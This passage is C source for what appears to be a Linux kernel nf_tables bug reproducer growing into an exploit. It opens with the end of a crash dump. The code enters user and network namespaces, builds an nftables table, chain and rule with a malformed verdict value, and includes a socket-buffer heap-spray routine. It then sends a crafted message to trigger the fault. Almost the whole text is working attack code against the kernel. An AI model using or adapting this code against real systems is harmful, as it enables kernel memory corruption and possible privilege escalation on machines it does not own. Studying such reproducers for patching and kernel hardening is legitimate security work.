  26:	48 c1 ea 03          	shr    $0x3,%rdx
* 2a:	80 3c 02 00          	cmpb   $0x0,(%rdx,%rax,1) <-- trapping instruction
  2e:	0f 85 fe 00 00 00    	jne    0x132
  34:	48 8b 6d 30          	mov    0x30(%rbp),%rbp
  38:	48 81 fd 30 cd d2 90 	cmp    $0xffffffff90d2cd30,%rbp
  3f:	0f                   	.byte 0xf

*/


#define _GNU_SOURCE

#include <endian.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h> /* open */
#include <fcntl.h> /* open */
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <libnftnl/chain.h>
#include <libnftnl/table.h>
#include <libnftnl/rule.h>
#include <libnftnl/set.h>
#include <libnftnl/object.h>
#include <libnftnl/expr.h>
#include <libmnl/libmnl.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/keyctl.h>
#include <linux/unistd.h>
#include <sched.h>
#define BITMASK(bf_off, bf_len) (((1ull << (bf_len)) - 1) << (bf_off))
#define STORE_BY_BITMASK(type, htobe, addr, val, bf_off, bf_len)               \
  *(type*)(addr) =                                                             \
      htobe((htobe(*(type*)(addr)) & ~BITMASK((bf_off), (bf_len))) |           \
            (((type)(val) << (bf_off)) & BITMASK((bf_off), (bf_len))))

uint64_t r[3] = {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff};



void create_table()
{

  struct mnl_socket *nl = mnl_socket_open(NETLINK_NETFILTER);
  struct mnl_nlmsg_batch *batch = NULL;
  struct nlmsghdr *nh = NULL;
  int r = 0;
  int seq = 0;
  char buf[16384] = {0};
  struct nftnl_table *table = NULL;
  table = nftnl_table_alloc();
  //TABLE VALUES
  nftnl_table_set_str(table, NFTNL_TABLE_NAME, "syz0");

  batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                     NFT_MSG_NEWTABLE, NFPROTO_INET,
                                     NLM_F_CREATE, seq++);
  nftnl_table_nlmsg_build_payload(nh, table);
  mnl_nlmsg_batch_next(batch);

  nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  r = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch));
  if (r < 0)
    puts("table mnl_socket_sendto");
}

void create_chain()
{
  struct mnl_socket *nl = mnl_socket_open(NETLINK_NETFILTER);
  struct mnl_nlmsg_batch *batch = NULL;
  struct nlmsghdr *nh = NULL;
  int r = 0;
  int seq = 0;
  char buf[16384] = {0};
  struct nftnl_chain *chain = NULL;
  chain = nftnl_chain_alloc();
  //CHAIN VALUES
  nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, "syz2");
  nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, "syz0");
  nftnl_chain_set_u32(chain, NFTNL_CHAIN_HOOKNUM, 3);
  nftnl_chain_set_u32(chain, NFTNL_CHAIN_PRIO, 0);

  batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  nh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                     NFT_MSG_NEWCHAIN, NFPROTO_INET,
                                     NLM_F_CREATE, seq++);
  nftnl_chain_nlmsg_build_payload(nh, chain);
  mnl_nlmsg_batch_next(batch);

  nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  r = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch));
  if (r < 0)
    puts("chain mnl_socket_sendto");
}

void create_rule()
{
  struct mnl_socket *nl = mnl_socket_open(NETLINK_NETFILTER);
  struct mnl_nlmsg_batch *batch = NULL;
  struct nlmsghdr *nh = NULL;
  int r = 0;
  int seq = 0;
  char buf[16384] = {0};
  struct nftnl_rule *rule = NULL;
  struct nftnl_expr *expr = NULL;
  rule = nftnl_rule_alloc();
  //RULE VALUES
  nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, "syz0");
	nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, "syz2");

  expr = nftnl_expr_alloc("immediate");
  //RULE EXPR VALUES
  nftnl_expr_set_u32(expr, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
  nftnl_expr_set_u32(expr, NFTNL_EXPR_IMM_VERDICT, 0xffff0000);
  nftnl_rule_add_expr(rule, expr);

  batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);
  nh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                     NFT_MSG_NEWRULE, NFPROTO_INET,
                                     NLM_F_CREATE, seq++);
  nftnl_rule_nlmsg_build_payload(nh, rule);
  mnl_nlmsg_batch_next(batch);

  nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  r = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch));
  if (r < 0)
    puts("rule mnl_socket_sendto");
}

void skbuff_spray()
{
  int ss[1024][2];
  char buf[512];
  memset(buf, 0x41, 512);
  for (int i = 0; i < 4; i++) {
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
      perror("[-] socketpair");
      exit(0);
    }
    for (int j = 0; j < 128; j++) {
      if (write(ss[i][0], buf, 512) < 0) {
        perror("[-] write");
        exit(0);
      }
    }
    puts("spraying");
  }
}

void sandbox()
{
  cpu_set_t my_set;
  CPU_ZERO(&my_set);
  CPU_SET(0, &my_set);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set) == -1) {
    perror("sched_setaffinity()");
    exit(1);
  }
}




void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

//& NLA_TYPE_MASK
#include <pthread.h>
int main(void)
{
  unshare_setup(getuid(), getgid());
  sandbox();
  syscall(__NR_mmap, /*addr=*/0x1ffff000ul, /*len=*/0x1000ul, /*prot=*/0ul,
          /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
  syscall(__NR_mmap, /*addr=*/0x20000000ul, /*len=*/0x1000000ul, /*prot=*/7ul,
          /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
  syscall(__NR_mmap, /*addr=*/0x21000000ul, /*len=*/0x1000ul, /*prot=*/0ul,
          /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
  intptr_t res = 0;

  unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);
  create_table();
  create_chain();
  create_rule();

  res = syscall(__NR_socket, /*domain=*/0xaul, /*type=*/2ul, /*proto=*/0x11);
  if (res != -1)
    r[2] = res;
  *(uint64_t*)0x20000040 = 0x20000000;
  *(uint16_t*)0x20000000 = 2;
  *(uint16_t*)0x20000002 = 0x54fd;
  *(uint32_t*)0x20000004 = 0;
  *(uint32_t*)0x20000008 = 0;
  *(uint32_t*)0x20000048 = 0x59;
  *(uint64_t*)0x20000050 = 0x200001c0;
  *(uint64_t*)0x200001c0 = 0;
  *(uint64_t*)0x200001c8 = 0;
  *(uint64_t*)0x20000058 = 1;
  *(uint64_t*)0x20000060 = 0;
  *(uint64_t*)0x20000068 = 0;
  *(uint32_t*)0x20000070 = 0;
  //pthread_t thread_id;
  //pthread_create(&thread_id, NULL, skbuff_spray, NULL);
  //usleep(0x88);
  syscall(__NR_sendmsg, /*fd=*/r[2], /*msg=*/0x20000040ul, /*f=*/0ul);
  return 0;
}
